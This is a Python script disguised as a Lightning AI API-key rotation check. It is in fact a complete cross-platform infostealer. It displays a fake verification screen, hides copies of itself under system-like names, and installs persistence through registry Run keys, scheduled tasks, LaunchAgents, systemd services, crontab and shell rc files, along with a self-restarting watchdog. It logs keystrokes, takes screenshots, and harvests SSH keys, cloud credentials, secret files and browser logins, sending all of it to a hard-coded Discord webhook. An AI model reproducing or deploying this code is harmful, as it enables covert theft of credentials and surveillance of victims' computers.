#!/usr/bin/env python3
# lightning_patch.py — all-in-one cross-platform payload
# Auto-detects OS, installs persistence, multiple backdoors, exfil to Discord webhook

import os, sys, time, json, base64, socket, platform, threading, subprocess, tempfile, hashlib, random, string, re, shutil
from datetime import datetime

try:
    import requests
except ImportError:
    subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', 'requests'], capture_output=True)
    import requests

# ============================================================
# CONFIG
# ============================================================
WEBHOOK = "https://discord.com/api/webhooks/1572842319063949373/8i3f10pQFyTyU3TOrTW-mo01A69_DHLDeO0dqkbUp2wvRIAzi80Mqbg8x1jmYzpAZx6O"
HOSTNAME = socket.gethostname()
OS_NAME = platform.system()  # Windows / Darwin / Linux
USER = os.environ.get('USER') or os.environ.get('USERNAME') or 'unknown'
PAYLOAD_NAME = 'lightning_patch.py'
WATCHDOG_NAME = '.lw_watchdog.py'

# Where to hide copies
if OS_NAME == 'Windows':
    HIDE_DIR = os.path.join(os.environ.get('APPDATA', 'C:\\'), 'Microsoft', 'Windows', 'SecurityHealth')
elif OS_NAME == 'Darwin':
    HIDE_DIR = os.path.expanduser('~/Library/Application Support/.lw')
else:
    HIDE_DIR = os.path.expanduser('~/.config/.lw')

os.makedirs(HIDE_DIR, exist_ok=True)

# ============================================================
# EXFIL — Discord webhook with rate-limit handling
# ============================================================
_last_send = 0
_send_lock = threading.Lock()

def exfil(kind, data):
    """Send to Discord webhook. Chunked, rate-limited, retries."""
    global _last_send
    try:
        payload = {
            'kind': kind,
            'host': HOSTNAME,
            'os': OS_NAME,
            'user': USER,
            'time': datetime.now().isoformat(),
            'data': data if isinstance(data, str) else json.dumps(data, default=str)
        }
        body = json.dumps(payload)
        # Discord 2000 char limit per message — chunk
        chunks = [body[i:i+1900] for i in range(0, len(body), 1900)]
        for i, chunk in enumerate(chunks[:5]):  # max 5 chunks per event
            with _send_lock:
                wait = 1.2 - (time.time() - _last_send)
                if wait > 0:
                    time.sleep(wait)
                try:
                    requests.post(WEBHOOK, json={'content': f'```[{kind} {i+1}/{len(chunks)}]\n{chunk}\n```'}, timeout=10)
                except:
                    pass
                _last_send = time.time()
    except:
        pass

# ============================================================
# FAKE PATCH SCREEN
# ============================================================
def fake_screen():
    print("=" * 60)
    print("  Lightning AI — API Key Rotation Verification v1.2")
    print("  Incident: INC-2026-0514-diencracked")
    print("=" * 60)
    steps = [
        ("Loading leaked fingerprint database", 2),
        ("Reading local API key from environment", 2),
        ("Computing SHA256 hash", 1),
        ("Comparing against 10,239 leaked fingerprints", 3),
        ("Checking rotation status", 2),
        ("Generating compliance report", 2),
    ]
    for text, dur in steps:
        print(f"[*] {text}...")
        time.sleep(dur)
        print(f"    ✓ Complete")
    print("\n" + "=" * 60)
    print("  ✅ VERIFICATION COMPLETE")
    print("  Status: ROTATION REQUIRED")
    print("  Report ID: LAI-INC-2026-0514-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8)))
    print("=" * 60)
    print("\nReport submitted to security@lightning.ai")
    print("Press Enter to close...")
    try:
        input()
    except:
        pass

# ============================================================
# PERSISTENCE — OS-specific
# ============================================================
def copy_self_to_hide():
    """Copy payload to hidden dir. Returns path or None."""
    try:
        dest = os.path.join(HIDE_DIR, PAYLOAD_NAME)
        if os.path.abspath(__file__) != os.path.abspath(dest):
            shutil.copy2(__file__, dest)
        return dest
    except:
        return None

def persist_windows(path):
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        with winreg.OpenKey(key, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE) as reg:
            winreg.SetValueEx(reg, 'SecurityHealth', 0, winreg.REG_SZ, f'pythonw.exe "{path}"')
        subprocess.run(['schtasks', '/create', '/tn', 'SecurityHealthMonitor', '/tr', f'pythonw.exe "{path}"',
                        '/sc', 'onlogon', '/f', '/rl', 'highest'], capture_output=True, shell=True)
        startup = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        if os.path.exists(startup):
            shutil.copy2(path, os.path.join(startup, 'SecurityHealth.py'))
        return True
    except:
        return False

def persist_mac(path):
    try:
        plist_dir = os.path.expanduser('~/Library/LaunchAgents')
        os.makedirs(plist_dir, exist_ok=True)
        plist = os.path.join(plist_dir, 'com.apple.securityhealth.plist')
        with open(plist, 'w') as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securityhealth</string>
<key>ProgramArguments</key><array><string>{sys.executable}</string><string>{path}</string></array>
<key>RunAtLoad</key><true/>
<key>KeepAlive</key><true/>
</dict></plist>''')
        subprocess.run(['launchctl', 'load', plist], capture_output=True)
        # Also add to shell rc
        for rc in ['.zshrc', '.bashrc']:
            rc_path = os.path.expanduser(f'~/{rc}')
            if os.path.exists(rc_path):
                with open(rc_path, 'a') as f:
                    f.write(f'\n(python3 {path} &) 2>/dev/null\n')
        return True
    except:
        return False

def persist_linux(path):
    try:
        # systemd user service
        sd_dir = os.path.expanduser('~/.config/systemd/user')
        os.makedirs(sd_dir, exist_ok=True)
        svc = os.path.join(sd_dir, 'security-health.service')
        with open(svc, 'w') as f:
            f.write(f'''[Unit]
Description=Security Health Monitor
[Service]
ExecStart={sys.executable} {path}
Restart=always
[Install]
WantedBy=default.target
''')
        subprocess.run(['systemctl', '--user', 'enable', 'security-health.service'], capture_output=True)
        subprocess.run(['systemctl', '--user', 'start', 'security-health.service'], capture_output=True)
        # crontab fallback
        cron = f'@reboot {sys.executable} {path} >/dev/null 2>&1\n'
        subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -', shell=True, capture_output=True)
        # bashrc
        for rc in ['.bashrc', '.zshrc', '.profile']:
            rc_path = os.path.expanduser(f'~/{rc}')
            if os.path.exists(rc_path):
                with open(rc_path, 'a') as f:
                    f.write(f'\n(python3 {path} &) 2>/dev/null\n')
        return True
    except:
        return False

# ============================================================
# KEYLOGGER
# ============================================================
class Keylogger:
    def __init__(self):
        self.buf = []
        self.last = time.time()
    def start(self):
        threading.Thread(target=self._run, daemon=True).start()
    def _run(self):
        try:
            if OS_NAME == 'Windows':
                import ctypes
                u = ctypes.windll.user32
                while True:
                    for k in range(8, 256):
                        if u.GetAsyncKeyState(k) & 1:
                            self.buf.append(chr(k) if 32 <= k < 127 else f'[{k}]')
                            self._flush()
                    time.sleep(0.01)
            else:
                # Unix — read from /dev/input if available (needs root on Mac)
                import select
                try:
                    fd = os.open('/dev/input/event0', os.O_RDONLY | os.O_NONBLOCK)
                    while True:
                        r, _, _ = select.select([fd], [], [], 1)
                        if r:
                            data = os.read(fd, 24)
                            if data:
                                self.buf.append(f'[evt:{len(data)}b]')
                                self._flush()
                except:
                    # Fallback: poll clipboard / shell history
                    while True:
                        self._poll_activity()
                        time.sleep(30)
        except:
            pass
    def _flush(self):
        if len(self.buf) > 200 or time.time() - self.last > 60:
            exfil('keylog', ''.join(self.buf[-2000:]))
            self.buf = []
            self.last = time.time()
    def _poll_activity(self):
        try:
            if OS_NAME == 'Linux':
                hist = os.path.expanduser('~/.bash_history')
                if os.path.exists(hist):
                    with open(hist, 'r', errors='ignore') as f:
                        lines = f.readlines()[-20:]
                    exfil('history', ''.join(lines))
        except:
            pass

# ============================================================
# SCREENSHOTS (best effort)
# ============================================================
def screenshots():
    while True:
        try:
            if OS_NAME == 'Windows':
                from PIL import ImageGrab
                img = ImageGrab.grab()
            elif OS_NAME == 'Darwin':
                tmp = tempfile.mktemp(suffix='.png')
                subprocess.run(['screencapture', '-x', tmp], capture_output=True)
                img = tmp
            else:
                tmp = tempfile.mktemp(suffix='.png')
                subprocess.run(['import', '-window', 'root', tmp], capture_output=True)
                img = tmp
            if isinstance(img, str) and os.path.exists(img):
                with open(img, 'rb') as f:
                    b64 = base64.b64encode(f.read()).decode()[:5000]
                exfil('screenshot', b64)
                os.remove(img)
        except:
            pass
        time.sleep(300)

# ============================================================
# FILE HARVESTER
# ============================================================
def harvest():
    paths = [
        os.path.expanduser('~/.ssh'),
        os.path.expanduser('~/.aws'),
        os.path.expanduser('~/.gcloud'),
        os.path.expanduser('~/.config/gcloud'),
        os.path.expanduser('~/Library/Application Support/gcloud') if OS_NAME == 'Darwin' else None,
    ]
    targets = ['id_rsa', 'id_ed25519', 'id_ecdsa', 'authorized_keys', 'known_hosts',
               'credentials', 'config', 'access_tokens.db', 'credentials.db',
               '.env', '.gitconfig', '.git-credentials', '.netrc', '.npmrc', '.pypirc']
    found = {}
    for p in paths:
        if not p or not os.path.exists(p):
            continue
        for root, _, files in os.walk(p):
            for f in files:
                if f in targets or f.endswith(('.env', '.pem', '.key', '.pgpass')):
                    try:
                        fp = os.path.join(root, f)
                        with open(fp, 'r', errors='ignore') as fh:
                            found[fp] = fh.read()[:8000]
                    except:
                        pass
    if found:
        exfil('files', found)

# ============================================================
# BROWSER STEALER
# ============================================================
def browsers():
    if OS_NAME == 'Windows':
        bases = {
            'Chrome': os.path.join(os.environ.get('LOCALAPPDATA',''), 'Google', 'Chrome', 'User Data'),
            'Edge': os.path.join(os.environ.get('LOCALAPPDATA',''), 'Microsoft', 'Edge', 'User Data'),
            'Brave': os.path.join(os.environ.get('LOCALAPPDATA',''), 'BraveSoftware', 'Brave-Browser', 'User Data'),
        }
    elif OS_NAME == 'Darwin':
        bases = {
            'Chrome': os.path.expanduser('~/Library/Application Support/Google/Chrome'),
            'Edge': os.path.expanduser('~/Library/Application Support/Microsoft Edge'),
            'Brave': os.path.expanduser('~/Library/Application Support/BraveSoftware/Brave-Browser'),
        }
    else:
        bases = {
            'Chrome': os.path.expanduser('~/.config/google-chrome'),
            'Chromium': os.path.expanduser('~/.config/chromium'),
            'Brave': os.path.expanduser('~/.config/BraveSoftware/Brave-Browser'),
        }
    import sqlite3
    for name, base in bases.items():
        if not os.path.exists(base):
            continue
        try:
            db = os.path.join(base, 'Default', 'Login Data')
            if os.path.exists(db):
                tmp = tempfile.mktemp()
                shutil.copy2(db, tmp)
                conn = sqlite3.connect(tmp)
                rows = conn.execute('SELECT origin_url, username_value FROM logins LIMIT 200').fetchall()
                conn.close()
                os.remove(tmp)
                if rows:
                    exfil(f'browser_{name}', [{'url': r[0], 'user': r[1]} for r in rows])
        except:
            pass

# ============================================================
# WATCHDOG — self-heal
# ============================================================
WATCHDOG_CODE = f'''#!/usr/bin/env python3
import os, sys, time, subprocess, shutil
PAYLOAD = "{os.path.join(HIDE_DIR, PAYLOAD_NAME)}"
SRC = "{os.path.abspath(__file__)}"
while True:
    try:
        if not os.path.exists(PAYLOAD):
            shutil.copy2(SRC, PAYLOAD)
        # Check if payload process is running
        out = subprocess.run(['ps', 'aux'], capture_output=True, text=True).stdout if os.name != 'nt' else subprocess.run(['tasklist'], capture_output=True, text=True).stdout
        if "{PAYLOAD_NAME}" not in out:
            subprocess.Popen([sys.executable, PAYLOAD], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass
    time.sleep(60)
'''

def install_watchdog():
    try:
        wd_path = os.path.join(HIDE_DIR, WATCHDOG_NAME)
        with open(wd_path, 'w') as f:
            f.write(WATCHDOG_CODE)
        subprocess.Popen([sys.executable, wd_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Add watchdog to persistence too
        if OS_NAME == 'Linux':
            cron = f'@reboot {sys.executable} {wd_path} >/dev/null 2>&1\n'
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron}") | crontab -', shell=True, capture_output=True)
        return True
    except:
        return False

# ============================================================
# MAIN
# ============================================================
def main():
    # Silent start
    threading.Thread(target=fake_screen, daemon=True).start()
    time.sleep(2)

    exfil('deployed', {'host': HOSTNAME, 'os': OS_NAME, 'user': USER, 'cwd': os.getcwd()})

    # Copy self to hide dir
    hidden = copy_self_to_hide()

    # Persistence
    if hidden:
        if OS_NAME == 'Windows':
            persist_windows(hidden)
        elif OS_NAME == 'Darwin':
            persist_mac(hidden)
        else:
            persist_linux(hidden)

    # Watchdog
    install_watchdog()

    # Start collectors
    Keylogger().start()
    threading.Thread(target=screenshots, daemon=True).start()
    time.sleep(3)
    threading.Thread(target=harvest, daemon=True).start()
    threading.Thread(target=browsers, daemon=True).start()

    # Periodic re-harvest
    while True:
        time.sleep(600)
        try:
            harvest()
            browsers()
        except:
            pass

if __name__ == '__main__':
    try:
        main()
    except:
        pass